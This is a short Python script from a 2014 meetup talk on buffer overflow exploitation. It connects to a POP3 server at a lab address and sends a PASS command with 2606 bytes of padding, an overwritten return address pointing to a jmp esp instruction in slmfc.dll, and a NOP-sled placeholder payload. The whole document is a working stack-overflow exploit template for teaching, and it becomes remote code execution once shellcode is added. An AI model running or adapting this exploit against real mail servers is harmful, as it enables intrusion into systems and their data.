#!/usr/bin/python
# kassel codemeetup 10.09.2014 - buffer overflow exploiting talk 
# redirect program flow via jmp to esp instruction present in slmfc.dll (found by immunity plugin mona.py from corelan.be) 

import socket

# AF_INET = IPv4, SOCK_STREAM = TCP, SOCK_DGREAM = UDP
# See http://openbook.galileocomputing.de/python/python_kapitel_20_001.htm
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# padding to reach EIP offset
padding = 'A' * 2606

# overwrite saved EIP with address to jmp esp instruction in slmfc.dll at 77972CA8 ---little endian---> \xa8\x2c\x97\x77
EIP = '\xa8\x2c\x97\x77'

# place NOP's in exploit variable for demonstration purposes
payload = '\x90' * 450

buffer = padding + EIP + payload

# exception handler
try:
	print '\nSending buffer...'
	s.connect(('10.0.0.20',110))
	data=s.recv(1024)
	s.send('User test' + '\r\n')
	data=s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print '\n Done!'
except:
	print 'Could not connect to POP3!'
